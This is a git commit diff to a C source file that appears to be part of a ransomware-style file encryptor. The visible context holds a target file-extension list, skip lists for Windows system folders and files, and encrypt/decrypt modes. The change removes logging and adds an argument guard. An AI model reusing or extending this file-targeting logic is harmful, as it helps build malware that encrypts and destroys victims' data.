585a52e56fcb59157f7d13efda3df8c876719f9d
ego1155 <34691688+ego1155@users.noreply.github.com>
2021-10-01 00:42:42 -0700

    update

--- WinLinux/Test/Sources/main.c
+++ WinLinux/Test/Sources/main.c
@@ -25,7 +25,6 @@ const char* exts = ",c,h,d,f,m,p,r,s,v,i,as,,mx,bc,sh,nt,bb,ml,cc,hh,cs,em,bi,hs
 
 const char* exdir = ",$Recycle.Bin,Documents and Settings,PerfLogs,Program Files,Program Files (x86),Windows,";
 const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT,";
-const char* defile = "c:\\sun.txt";
 
 void toLower(char* str)
 {
@@ -358,17 +357,6 @@ void * tp_pfr_free_func(void *arg)
 	return NULL;
 }
 
-int WriteToLog(char* str)
-{
-    FILE* log;
-    log = fopen("log.txt", "a+");
-    if (log == NULL)
-        return -1;
-    fprintf(log, "%s\n", str);
-    fclose(log);
-    return 0;
-}
-
 int main(int argc, char *argv[])
 {
 	if (argc != 2) return EXIT_SUCCESS;
@@ -378,6 +366,8 @@ int main(int argc, char *argv[])
 		mode = 1;
 	else if (strcmp(argv[1], "decrypt") == 0)
 		mode = 2;
+	
+	if (mode==0) return EXIT_SUCCESS;
 	
 	srand (time(NULL));
 	
